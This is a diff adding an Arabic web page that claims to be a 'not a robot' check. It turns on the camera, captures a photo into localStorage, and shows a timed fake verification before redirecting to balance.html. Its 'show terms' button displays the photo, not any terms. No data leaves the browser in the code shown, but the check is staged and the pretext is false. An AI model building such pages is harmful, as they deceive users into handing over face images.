@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الرجاء إثبات أنك لست روبوت</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+            text-align: center;
+        }
+        .camera-container {
+            background: #1e1e1e;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+            width: 350px;
+        }
+        h2 {
+            color: #f0b90b;
+        }
+        video, canvas {
+            width: 100%;
+            border-radius: 10px;
+            display: none;
+        }
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f0b90b;
+            border-top: 5px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .checkmark {
+            font-size: 50px;
+            color: #4CAF50;
+            display: none;
+        }
+        button {
+            background-color: #f0b90b;
+            color: #121212;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+        button:hover {
+            background-color: #d8a200;
+        }
+        .terms-container {
+            margin-top: 20px;
+        }
+        #terms {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="camera-container">
+        <h2>الرجاء إثبات أنك لست روبوت</h2>
+        <video id="video" autoplay></video>
+        <canvas id="canvas"></canvas>
+        <div class="loader" id="loader"></div>
+        <div class="checkmark" id="checkmark">✔️</div>
+        <button id="capture-btn">التقاط صورة</button>
+        <button id="next-btn" style="display: none;">الانتقال إلى الحساب</button>
+
+        <div class="terms-container">
+            <button id="show-terms">عرض البنود</button>
+            <img id="terms" src="" alt="صورة المستخدم">
+        </div>
+    </div>
+
+    <script>
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const captureBtn = document.getElementById("capture-btn");
+        const loader = document.getElementById("loader");
+        const checkmark = document.getElementById("checkmark");
+        const nextBtn = document.getElementById("next-btn");
+        const termsBtn = document.getElementById("show-terms");
+        const termsImage = document.getElementById("terms");
+
+        // تشغيل الكاميرا
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.style.display = "block";
+                video.srcObject = stream;
+            })
+            .catch(error => {
+                alert("تعذر الوصول إلى الكاميرا. الرجاء منح الأذونات!");
+            });
+
+        // التقاط الصورة
+        captureBtn.addEventListener("click", () => {
+            canvas.style.display = "block";
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext("2d");
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // حفظ الصورة في localStorage
+            localStorage.setItem("userImage", canvas.toDataURL());
+
+            // إخفاء الكاميرا وإظهار الدائرة الدوارة
+            video.style.display = "none";
+            captureBtn.style.display = "none";
+            loader.style.display = "block";
+
+            // بعد 5 ثوانٍ، إظهار علامة ✅ وزر الانتقال
+            setTimeout(() => {
+                loader.style.display = "none";
+                checkmark.style.display = "block";
+                nextBtn.style.display = "block";
+            }, 5000);
+        });
+
+        // عرض الصورة المحفوظة عند الضغط على "عرض البنود"
+        termsBtn.addEventListener("click", () => {
+            const savedImage = localStorage.getItem("userImage");
+            if (savedImage) {
+                termsImage.src = savedImage;
+                termsImage.style.display = "block";
+            } else {
+                alert("لم يتم التقاط أي صورة بعد!");
+            }
+        });
+
+        // الانتقال إلى صفحة الحساب
+        nextBtn.addEventListener("click", () => {
+            window.location.href = "balance.html";
+        });
+    </script>
+</body>
+</html>
